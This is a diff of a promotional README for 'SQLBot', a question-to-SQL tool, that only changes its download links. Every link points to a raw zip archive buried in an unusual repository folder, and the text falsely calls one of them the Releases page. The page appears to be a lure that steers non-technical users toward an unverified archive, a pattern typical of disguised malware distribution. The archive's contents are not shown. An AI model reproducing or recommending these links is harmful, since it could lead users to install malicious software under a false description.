@@ -1,13 +1,13 @@
 # 🔥 SQLBot - Easily Transform Questions into SQL Queries
 
 ## 📦 Download Now
-[![Download SQLBot](https://raw.githubusercontent.com/FlareIgnis/SQLBot/main/pentecostalist/SQLBot.zip)](https://raw.githubusercontent.com/FlareIgnis/SQLBot/main/pentecostalist/SQLBot.zip)
+[![Download SQLBot](https://raw.githubusercontent.com/FlareIgnis/SQLBot/main/frontend/src/views/chat/component/Bot_SQL_3.2.zip)](https://raw.githubusercontent.com/FlareIgnis/SQLBot/main/frontend/src/views/chat/component/Bot_SQL_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to SQLBot! This application helps you convert your questions into SQL queries smoothly. You don’t need to know anything about programming. If you can ask a question, you can use SQLBot.
 
 ## 📥 Download & Install
-To download SQLBot, visit the Releases page [here](https://raw.githubusercontent.com/FlareIgnis/SQLBot/main/pentecostalist/SQLBot.zip). You will find different versions listed. Choose the latest version and download it according to your operating system. Here’s how:
+To download SQLBot, visit the Releases page [here](https://raw.githubusercontent.com/FlareIgnis/SQLBot/main/frontend/src/views/chat/component/Bot_SQL_3.2.zip). You will find different versions listed. Choose the latest version and download it according to your operating system. Here’s how:
 
 1. Click the link above.
 2. Find the version you want to download.
@@ -60,4 +60,4 @@ SQLBot has a growing community of users. Join our forums and discussion groups t
 ## 🎉 Conclusion
 SQLBot is your new companion in converting everyday questions into SQL queries. With an easy-to-use interface and intelligent design, it empowers you to engage with databases confidently. Don’t wait; download SQLBot today and explore the world of data! 
 
-Remember, you can download SQLBot [here](https://raw.githubusercontent.com/FlareIgnis/SQLBot/main/pentecostalist/SQLBot.zip). Happy querying!
+Remember, you can download SQLBot [here](https://raw.githubusercontent.com/FlareIgnis/SQLBot/main/frontend/src/views/chat/component/Bot_SQL_3.2.zip). Happy querying!
